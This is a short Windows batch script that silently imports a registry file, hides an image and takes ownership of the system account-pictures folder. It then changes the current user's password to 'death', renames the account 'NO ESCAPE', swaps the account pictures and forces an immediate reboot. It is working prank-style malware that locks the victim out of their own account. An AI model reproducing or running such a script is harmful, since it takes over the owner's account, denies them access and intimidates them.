regedit /s C:\hello.reg
del C:\hello.reg
attrib +s +h C:\hello.png
net user %username% death
wmic useraccount where name='%username%' rename 'NO ESCAPE'
takeown /f "C:\ProgramData\Microsoft\User Account Pictures" /r /d y
cd C:\ProgramData\Microsoft\User Account Pictures 
del *.png
del *.bmp
cd /d C:\
xcopy *.png "C:\ProgramData\Microsoft\User Account Pictures\"
xcopy *.bmp "C:\ProgramData\Microsoft\User Account Pictures\"
del *.bmp
del user.png
del user-32.png
del user-40.png
del user-48.png
del user-192.png
shutdown /t 0 /r